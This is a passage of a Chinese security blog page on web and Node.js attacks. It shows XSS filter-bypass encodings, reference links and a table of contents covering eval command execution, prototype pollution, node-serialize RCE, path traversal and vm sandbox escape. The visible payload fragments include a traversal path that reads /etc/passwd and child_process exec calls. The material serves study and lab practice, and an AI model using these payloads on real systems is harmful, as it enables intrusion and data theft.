parseInt(&quot;alert&quot;,30). Other bases also work</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">##### 10.mXSS和DOM攻击</span><br><span class="line">###### 对于XSS过滤器来说，它们基本上不可能正确地预测浏览器如何跟HTML以及交互库进行数据处理的方式。因此，有的时候我们就可以将XSS Payload作为无效的HTML插入到目标页面中，然后浏览器将有可能把它作为有效Payload执行，这样就可以绕过过滤器了。</span><br><span class="line">###### 下面给出的是一个能够绕过最常见过滤器([DOMPurify &lt;2.0.1](https://research.securitum.com/dompurify-bypass-using-mxss/))的mXSS Payload：</span><br><span class="line"></span><br><span class="line">##### 11.双重编码</span><br><span class="line">###### 有的时候，应用程序会在字符串再次解码之前，对其执行XSS过滤，这样就会给我们留下实现绕过的可乘之机。</span><br><span class="line">| 字符                   | 双创编码          |</span><br><span class="line">| :-------------------: | :----------------:| </span><br><span class="line">| &lt;            	        |  %253C            |</span><br><span class="line">| \&gt;            	    |  %253E            |</span><br><span class="line">| (            	        |  %2528            |</span><br><span class="line">| )            	        |  %2529            |</span><br><span class="line">| ”            	        |  %2522            |</span><br><span class="line">| ’            	        |  %2527            | </span><br><span class="line"></span><br><span class="line">##### 参考资料</span><br><span class="line">```text</span><br><span class="line">1、https://www.vulnerability-lab.com/resources/documents/531.txt</span><br><span class="line"></span><br><span class="line">2、https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</span><br><span class="line"></span><br><span class="line">3、https://portswigger.net/research/abusing-javascript-frameworks-to-bypass-xss-mitigations</span><br><span class="line"></span><br><span class="line">4、https://cure53.de/fp170.pdf</span><br><span class="line"></span><br><span class="line">5、https://www.*******.com/watch?v=5W-zGBKvLxk</span><br><span class="line"></span><br><span class="line">6、https://xss.pwnfunction.com/</span><br></pre></td></tr></table></figure>
+
+<h5 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h5><h6 id="https-wooyun-js-org-drops-E4-B8-80-E4-B8-AA-E5-8F-AF-E5-A4-A7-E8-A7-84-E6-A8-A1-E6-82-84-E6-97-A0-E5-A3-B0-E6-81-AF-E7-AA-83-E5-8F-96-E6-B7-98-E5-AE-9D-E6-94-AF-E4-BB-98-E5-AE-9D-E8-B4-A6-E5-8F-B7-E4-B8-8E-E5-AF-86-E7-A0-81-E7-9A-84-E6-BC-8F-E6-B4-9E-20-EF-BC-88-E5-9F-8B-E9-9B-B7-E5-BC-8F-E6-94-BB-E5-87-BB-E9-99-84-E5-B8-A6-E8-A7-86-E9-A2-91-E6-BC-94-E7-A4-BA-EF-BC-89-html"><a href="#https-wooyun-js-org-drops-E4-B8-80-E4-B8-AA-E5-8F-AF-E5-A4-A7-E8-A7-84-E6-A8-A1-E6-82-84-E6-97-A0-E5-A3-B0-E6-81-AF-E7-AA-83-E5-8F-96-E6-B7-98-E5-AE-9D-E6-94-AF-E4-BB-98-E5-AE-9D-E8-B4-A6-E5-8F-B7-E4-B8-8E-E5-AF-86-E7-A0-81-E7-9A-84-E6-BC-8F-E6-B4-9E-20-EF-BC-88-E5-9F-8B-E9-9B-B7-E5-BC-8F-E6-94-BB-E5-87-BB-E9-99-84-E5-B8-A6-E8-A7-86-E9-A2-91-E6-BC-94-E7-A4-BA-EF-BC-89-html" class="headerlink" title="https://wooyun.js.org/drops/%E4%B8%80%E4%B8%AA%E5%8F%AF%E5%A4%A7%E8%A7%84%E6%A8%A1%E6%82%84%E6%97%A0%E5%A3%B0%E6%81%AF%E7%AA%83%E5%8F%96%E6%B7%98%E5%AE%9D.%E6%94%AF%E4%BB%98%E5%AE%9D%E8%B4%A6%E5%8F%B7%E4%B8%8E%E5%AF%86%E7%A0%81%E7%9A%84%E6%BC%8F%E6%B4%9E%20-%EF%BC%88%E5%9F%8B%E9%9B%B7%E5%BC%8F%E6%94%BB%E5%87%BB%E9%99%84%E5%B8%A6%E8%A7%86%E9%A2%91%E6%BC%94%E7%A4%BA%EF%BC%89.html"></a><a href="https://wooyun.js.org/drops/%E4%B8%80%E4%B8%AA%E5%8F%AF%E5%A4%A7%E8%A7%84%E6%A8%A1%E6%82%84%E6%97%A0%E5%A3%B0%E6%81%AF%E7%AA%83%E5%8F%96%E6%B7%98%E5%AE%9D.%E6%94%AF%E4%BB%98%E5%AE%9D%E8%B4%A6%E5%8F%B7%E4%B8%8E%E5%AF%86%E7%A0%81%E7%9A%84%E6%BC%8F%E6%B4%9E%20-%EF%BC%88%E5%9F%8B%E9%9B%B7%E5%BC%8F%E6%94%BB%E5%87%BB%E9%99%84%E5%B8%A6%E8%A7%86%E9%A2%91%E6%BC%94%E7%A4%BA%EF%BC%89.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/%E4%B8%80%E4%B8%AA%E5%8F%AF%E5%A4%A7%E8%A7%84%E6%A8%A1%E6%82%84%E6%97%A0%E5%A3%B0%E6%81%AF%E7%AA%83%E5%8F%96%E6%B7%98%E5%AE%9D.%E6%94%AF%E4%BB%98%E5%AE%9D%E8%B4%A6%E5%8F%B7%E4%B8%8E%E5%AF%86%E7%A0%81%E7%9A%84%E6%BC%8F%E6%B4%9E%20-%EF%BC%88%E5%9F%8B%E9%9B%B7%E5%BC%8F%E6%94%BB%E5%87%BB%E9%99%84%E5%B8%A6%E8%A7%86%E9%A2%91%E6%BC%94%E7%A4%BA%EF%BC%89.html</a></h6><h6 id="https-www-freebuf-com-articles-web-226719-html"><a href="#https-www-freebuf-com-articles-web-226719-html" class="headerlink" title="https://www.freebuf.com/articles/web/226719.html"></a><a href="https://www.freebuf.com/articles/web/226719.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/226719.html</a></h6><h4 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h4><h6 id="相关javascript的知识总结。"><a href="#相关javascript的知识总结。" class="headerlink" title="相关javascript的知识总结。"></a>相关javascript的知识总结。</h6><h4 id="0x08-参考链接："><a href="#0x08-参考链接：" class="headerlink" title="0x08 参考链接："></a>0x08 参考链接：</h4><h6 id="https-xz-aliyun-com-t-7184"><a href="#https-xz-aliyun-com-t-7184" class="headerlink" title="https://xz.aliyun.com/t/7184"></a><a href="https://xz.aliyun.com/t/7184" target="_blank" rel="noopener">https://xz.aliyun.com/t/7184</a></h6><h6 id="浅谈Node-js-Web的安全问题"><a href="#浅谈Node-js-Web的安全问题" class="headerlink" title="浅谈Node.js Web的安全问题"></a><a href="https://www.freebuf.com/articles/web/152891.html" target="_blank" rel="noopener">浅谈Node.js Web的安全问题</a></h6><h6 id="深入理解JavaScript-Prototype污染攻击"><a href="#深入理解JavaScript-Prototype污染攻击" class="headerlink" title="深入理解JavaScript Prototype污染攻击"></a><a href="https://www.freebuf.com/articles/web/200406.html" target="_blank" rel="noopener">深入理解JavaScript Prototype污染攻击</a></h6><h6 id="利用-Node-js-反序列化漏洞远程执行代码"><a href="#利用-Node-js-反序列化漏洞远程执行代码" class="headerlink" title="利用 Node.js 反序列化漏洞远程执行代码"></a><a href="https://paper.seebug.org/213/" target="_blank" rel="noopener">利用 Node.js 反序列化漏洞远程执行代码</a></h6><h6 id="Sandboxing-NodeJS-is-hard-here-is-why"><a href="#Sandboxing-NodeJS-is-hard-here-is-why" class="headerlink" title="Sandboxing NodeJS is hard, here is why"></a><a href="https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html" target="_blank" rel="noopener">Sandboxing NodeJS is hard, here is why</a></h6><h6 id="https-segmentfault-com-a-1190000012672620-1"><a href="#https-segmentfault-com-a-1190000012672620-1" class="headerlink" title="https://segmentfault.com/a/1190000012672620"></a><a href="https://segmentfault.com/a/1190000012672620" target="_blank" rel="noopener">https://segmentfault.com/a/1190000012672620</a></h6><h6 id="Fuzz中的javascript大小写特性"><a href="#Fuzz中的javascript大小写特性" class="headerlink" title="Fuzz中的javascript大小写特性"></a><a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html" target="_blank" rel="noopener">Fuzz中的javascript大小写特性</a></h6>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/03/14/记录一下XSS-Game的过程/" rel="next" title="记录一下XSS Game的过程">
+                <i class="fa fa-chevron-left"></i> 记录一下XSS Game的过程
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ljdd520">
+            
+              <p class="site-author-name" itemprop="name">Ljdd520</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">46</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:yourname@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.wonderkun.cc/" title="wonderkun" target="_blank">wonderkun</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://example.com/" title="Title" target="_blank">Title</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-危险的函数所导致的命令执行"><span class="nav-number">1.1.</span> <span class="nav-text">0x01 危险的函数所导致的命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#eval"><span class="nav-number">1.1.1.</span> <span class="nav-text">eval()</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#eval-函数可计算某个字符串，并执行其中的javascript代码。和PHP中的eval函数一样，如果传入到函数中的参数可控并且没有经过严格的过滤时，就会导致漏洞的出现。"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">eval()函数可计算某个字符串，并执行其中的javascript代码。和PHP中的eval函数一样，如果传入到函数中的参数可控并且没有经过严格的过滤时，就会导致漏洞的出现。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#简单的例子："><span class="nav-number">1.1.1.2.</span> <span class="nav-text">简单的例子：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#main-js"><span class="nav-number">1.1.1.3.</span> <span class="nav-text">main.js</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞利用："><span class="nav-number">1.1.2.</span> <span class="nav-text">漏洞利用：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#Nodejs中的chile-process-exec调用的是-bash-sh，它是一个bash解释器，可以执行系统命令。在eval函数的参数中可以构造require-39-child-process-39-exec-39-39-来进行调用。"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">Nodejs中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令。在eval函数的参数中可以构造require(&#39;child_process&#39;).exec(&#39;&#39;);来进行调用。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#弹计算器-windows"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">弹计算器(windows):</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#读取文件-linux"><span class="nav-number">1.1.2.3.</span> <span class="nav-text">读取文件(linux):</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#反弹shell-linux"><span class="nav-number">1.1.2.4.</span> <span class="nav-text">反弹shell(linux):</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#如果上下文中没有require-类似于Code-Breaking-2018-Thejs-，则可以使用global-process-mainModule-constructor-load-39-child-process-39-exec-39-calc-39-来执行命令。"><span class="nav-number">1.1.2.5.</span> <span class="nav-text">如果上下文中没有require(类似于Code-Breaking 2018 Thejs)，则可以使用global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;calc&#39;)来执行命令。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#paypal一个命令执行的例子："><span class="nav-number">1.1.2.6.</span> <span class="nav-text">paypal一个命令执行的例子：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#demo-paypal-com-Node-js-code-injection-RCE"><span class="nav-number">1.1.2.7.</span> <span class="nav-text">[demo.paypal.com] Node.js code injection (RCE)</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#使用数组绕过过滤，再调用child-process执行命令"><span class="nav-number">1.1.2.8.</span> <span class="nav-text">(使用数组绕过过滤，再调用child_process执行命令)</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#类似命令"><span class="nav-number">1.1.3.</span> <span class="nav-text">类似命令</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#间隔两秒执行函数："><span class="nav-number">1.1.3.1.</span> <span class="nav-text">间隔两秒执行函数：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#两秒后执行函数："><span class="nav-number">1.1.3.2.</span> <span class="nav-text">两秒后执行函数：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#some-function处就类似于eval函数的参数"><span class="nav-number">1.1.3.3.</span> <span class="nav-text">some_function处就类似于eval函数的参数</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#还有使用函数的原生对象，例如输出Hello-world。"><span class="nav-number">1.1.3.4.</span> <span class="nav-text">还有使用函数的原生对象，例如输出Hello world。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#类似于php中的create-function。"><span class="nav-number">1.1.3.5.</span> <span class="nav-text">类似于php中的create_function。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#以上都可以导致命令执行"><span class="nav-number">1.1.3.6.</span> <span class="nav-text">以上都可以导致命令执行</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-Nodejs原型链污染漏洞"><span class="nav-number">1.2.</span> <span class="nav-text">0x02 Nodejs原型链污染漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#javascript原型链参考文章：继承与原型链"><span class="nav-number">1.2.0.1.</span> <span class="nav-text">javascript原型链参考文章：继承与原型链</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#文章内关于原型和原型链的知识写的非常详细，就不再总结整个过程了，以下为几个比较重要的点："><span class="nav-number">1.2.0.2.</span> <span class="nav-text">文章内关于原型和原型链的知识写的非常详细，就不再总结整个过程了，以下为几个比较重要的点：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#例子："><span class="nav-number">1.2.0.3.</span> <span class="nav-text">例子：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#原型链污染原理"><span class="nav-number">1.2.1.</span> <span class="nav-text">原型链污染原理</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#对于语句：object-a-b-value如果可以控制a、b、value的值，将a设置为proto，我们就可以给object对象的原型设置一个b属性，值为value。这样所有继承object对象原型的实例对象在本身不拥有b属性的情况下，都会拥有b属性，且值为value。"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">对于语句：object[a][b] = value如果可以控制a、b、value的值，将a设置为proto，我们就可以给object对象的原型设置一个b属性，值为value。这样所有继承object对象原型的实例对象在本身不拥有b属性的情况下，都会拥有b属性，且值为value。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#例子：-1"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">例子：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#结果如下："><span class="nav-number">1.2.1.3.</span> <span class="nav-text">结果如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#最终会输出两个Hello-World。为什么object2在没有设置foo属性的情况下，也会输出Hello-World呢？就是因为在第二条语句中，我们对object1的原型对象设置了一个foo属性，而object2和object1一样，都是继承了Object-prototype。在获取object2-foo时，由于object2本身不存在foo属性，就会往父类Object-prototype中去寻找。这就造成了一个原型链污染，所以原型链污染简单来说就是如果能够控制并修改一个对象的原型，就可以影响到所有和这个对象同一个原型的对象。"><span class="nav-number">1.2.1.4.</span> <span class="nav-text">最终会输出两个Hello World。为什么object2在没有设置foo属性的情况下，也会输出Hello World呢？就是因为在第二条语句中，我们对object1的原型对象设置了一个foo属性，而object2和object1一样，都是继承了Object.prototype。在获取object2.foo时，由于object2本身不存在foo属性，就会往父类Object.prototype中去寻找。这就造成了一个原型链污染，所以原型链污染简单来说就是如果能够控制并修改一个对象的原型，就可以影响到所有和这个对象同一个原型的对象。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#merge操作导致原型链的污染"><span class="nav-number">1.2.2.</span> <span class="nav-text">merge操作导致原型链的污染</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#merge操作是最常见可能控制键名的操作，也最能被原型链攻击。"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">merge操作是最常见可能控制键名的操作，也最能被原型链攻击。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#需要注意的点是："><span class="nav-number">1.2.2.2.</span> <span class="nav-text">需要注意的点是：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#在JSON解析的情况下，-proto-会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历object2的时候会存在这个键。"><span class="nav-number">1.2.2.3.</span> <span class="nav-text">在JSON解析的情况下，__proto__会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历object2的时候会存在这个键。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#结果如下：-1"><span class="nav-number">1.2.2.4.</span> <span class="nav-text">结果如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#可见object3的b是从原型中获取到的，说明Object已经被污染了。"><span class="nav-number">1.2.2.5.</span> <span class="nav-text">可见object3的b是从原型中获取到的，说明Object已经被污染了。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Code-Breaking-2018-Thejs"><span class="nav-number">1.2.3.</span> <span class="nav-text">Code-Breaking 2018 Thejs</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#这个题目已经有很多的分析文章了，但因为它是一个比较好的学习原型链污染的题目，还是值得自己再过一遍。"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">这个题目已经有很多的分析文章了，但因为它是一个比较好的学习原型链污染的题目，还是值得自己再过一遍。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#题目源码下载：http-code-breaking-com-puzzle-9"><span class="nav-number">1.2.3.2.</span> <span class="nav-text">题目源码下载：http://code-breaking.com/puzzle/9/</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#直接npm-install可以把需要的模块下下来。"><span class="nav-number">1.2.3.3.</span> <span class="nav-text">直接npm install可以把需要的模块下下来。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#server-js"><span class="nav-number">1.2.3.4.</span> <span class="nav-text">server.js</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#问题出在了lodashs-merge函数这里，这个函数存在原型链污染漏洞。但是光存在漏洞还不行，我们得寻找到可以利用的点。因为通过漏洞可以控制某一种实例对象原型的属性，所以我们需要去寻找一个可以被利用的属性。"><span class="nav-number">1.2.3.5.</span> <span class="nav-text">问题出在了lodashs.merge函数这里，这个函数存在原型链污染漏洞。但是光存在漏洞还不行，我们得寻找到可以利用的点。因为通过漏洞可以控制某一种实例对象原型的属性，所以我们需要去寻找一个可以被利用的属性。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#页面最终会通过lodash-template进行渲染，跟踪到lodash-template-js中。"><span class="nav-number">1.2.3.6.</span> <span class="nav-text">页面最终会通过lodash.template进行渲染，跟踪到lodash/template.js中。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#如上图所示，可以看到options是一个对象，sourceURL是通过下面的语句赋值的，options默认没有sourceURL属性，所以sourceURL默认也是为空。"><span class="nav-number">1.2.3.7.</span> <span class="nav-text">如上图所示，可以看到options是一个对象，sourceURL是通过下面的语句赋值的，options默认没有sourceURL属性，所以sourceURL默认也是为空。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#如果我们能够给options的原型对象加一个sourceURL属性，那么我们就可以控制sourceURL的值。"><span class="nav-number">1.2.3.8.</span> <span class="nav-text">如果我们能够给options的原型对象加一个sourceURL属性，那么我们就可以控制sourceURL的值。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#继续往下面看，最后sourceURL传递到了Function函数的第二个参数当中："><span class="nav-number">1.2.3.9.</span> <span class="nav-text">继续往下面看，最后sourceURL传递到了Function函数的第二个参数当中：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#通过构造chile-process-exec-就可以执行任意代码了。"><span class="nav-number">1.2.3.10.</span> <span class="nav-text">通过构造chile_process.exec()就可以执行任意代码了。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#最终可以构造一个简单的Payload作为传递给主页面的的POST数据-windows调用计算器-："><span class="nav-number">1.2.3.11.</span> <span class="nav-text">最终可以构造一个简单的Payload作为传递给主页面的的POST数据(windows调用计算器)：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这里直接用require会报错：ReferenceError-require-is-not-defined"><span class="nav-number">1.2.3.12.</span> <span class="nav-text">(这里直接用require会报错：ReferenceError: require is not defined)</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#p神给了一个更好的payload："><span class="nav-number">1.2.3.13.</span> <span class="nav-text">p神给了一个更好的payload：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#node-serialize反序列化RCE漏洞-CVE-2017-5941"><span class="nav-number">1.2.4.</span> <span class="nav-text">node-serialize反序列化RCE漏洞(CVE-2017-5941)</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#漏洞出现在node-serialize模块0-0-4版本当中，使用npm-install-node-serialize-0-0-4安装模块。"><span class="nav-number">1.2.4.1.</span> <span class="nav-text">漏洞出现在node-serialize模块0.0.4版本当中，使用npm install node-serialize@0.0.4安装模块。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#IIFE-立即调用函数表达式-是一个在定义时就会立即执行的-JavaScript-函数。"><span class="nav-number">1.2.4.2.</span> <span class="nav-text">IIFE(立即调用函数表达式)是一个在定义时就会立即执行的 JavaScript 函数。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#IIFE一般写成下面的形式："><span class="nav-number">1.2.4.3.</span> <span class="nav-text">IIFE一般写成下面的形式：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#漏洞代码位于node-modules-node-serialize-lib-serialize-js中："><span class="nav-number">1.2.4.4.</span> <span class="nav-text">漏洞代码位于node_modules\node-serialize\lib\serialize.js中：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#其中的关键就是：obj-key-eval-39-39-obj-key-substring-FUNCFLAG-length-39-39-这一行语句，可以看到传递给eval的参数是用括号包裹的，所以如果构造一个function-函数，在反序列化时就会被当中IIFE立即调用执行。来看如何构造payload："><span class="nav-number">1.2.4.5.</span> <span class="nav-text">其中的关键就是：obj[key] = eval(&#39;(&#39; + obj[key].substring(FUNCFLAG.length) + &#39;)&#39;);这一行语句，可以看到传递给eval的参数是用括号包裹的，所以如果构造一个function(){}()函数，在反序列化时就会被当中IIFE立即调用执行。来看如何构造payload：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#生成的Payload为："><span class="nav-number">1.2.4.6.</span> <span class="nav-text">生成的Payload为：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#因为需要在反序列化时让其立即调用我们构造的函数，所以我们需要在生成的序列化语句的函数后面再添加一个-，结果如下："><span class="nav-number">1.2.4.7.</span> <span class="nav-text">因为需要在反序列化时让其立即调用我们构造的函数，所以我们需要在生成的序列化语句的函数后面再添加一个()，结果如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这里不能直接在对象内定义IIFE表达式，不然会序列化失败"><span class="nav-number">1.2.4.8.</span> <span class="nav-text">(这里不能直接在对象内定义IIFE表达式，不然会序列化失败)</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#传递给unserialize-注意转义单引号-："><span class="nav-number">1.2.4.9.</span> <span class="nav-text">传递给unserialize(注意转义单引号)：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#执行命令成功，结果如图："><span class="nav-number">1.2.4.10.</span> <span class="nav-text">执行命令成功，结果如图：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03-Nodejs目录穿越漏洞复现-CVE-2017-14849"><span class="nav-number">1.3.</span> <span class="nav-text">0x03 Nodejs目录穿越漏洞复现(CVE-2017-14849)</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#在vulhub上面可以直接下载到环境。"><span class="nav-number">1.3.0.1.</span> <span class="nav-text">在vulhub上面可以直接下载到环境。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#漏洞影响的版本："><span class="nav-number">1.3.0.2.</span> <span class="nav-text">漏洞影响的版本：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#用Burpsuite获取地址：-static-a-etc-passwd即可下载得到-etc-passwd文件"><span class="nav-number">1.3.0.3.</span> <span class="nav-text">用Burpsuite获取地址：/static/../../../a/../../../../etc/passwd即可下载得到/etc/passwd文件</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#具体分析可见：Node-js-CVE-2017-14849-漏洞分析"><span class="nav-number">1.3.0.4.</span> <span class="nav-text">具体分析可见：Node.js CVE-2017-14849 漏洞分析</span></a></li></ol></li></ol><li class="nav-item nav-level-4"><a class="nav-link" href="#0x04-vm沙箱逃逸"><span class="nav-number">1.4.</span> <span class="nav-text">0x04 vm沙箱逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#vm是用来实现一个沙箱环境，可以安全的执行不受信任的代码而不会影响到主程序。但是可以通过构造语句来进行逃逸："><span class="nav-number">1.4.0.1.</span> <span class="nav-text">vm是用来实现一个沙箱环境，可以安全的执行不受信任的代码而不会影响到主程序。但是可以通过构造语句来进行逃逸：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#逃逸例子："><span class="nav-number">1.4.0.2.</span> <span class="nav-text">逃逸例子：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#执行之后可以获取到主程序环境中的环境变量"><span class="nav-number">1.4.0.3.</span> <span class="nav-text">执行之后可以获取到主程序环境中的环境变量</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#上面例子的代码等价于如下代码："><span class="nav-number">1.4.0.4.</span> <span class="nav-text">上面例子的代码等价于如下代码：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#创建vm环境时，首先要初始化一个对象-sandbox，这个对象就是vm中脚本执行时的全局环境context，vm-脚本中全局-this-指向的就是这个对象。"><span class="nav-number">1.4.0.5.</span> <span class="nav-text">创建vm环境时，首先要初始化一个对象 sandbox，这个对象就是vm中脚本执行时的全局环境context，vm 脚本中全局 this 指向的就是这个对象。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#因为this-constructor-constructor返回的是一个Function-constructor，所以可以利用Function对象构造一个函数并执行。-此时Function对象的上下文环境是处于主程序中的-这里构造的函数内的语句是return-this-process-env，结果是返回了主程序的环境变量。"><span class="nav-number">1.4.0.6.</span> <span class="nav-text">因为this.constructor.constructor返回的是一个Function 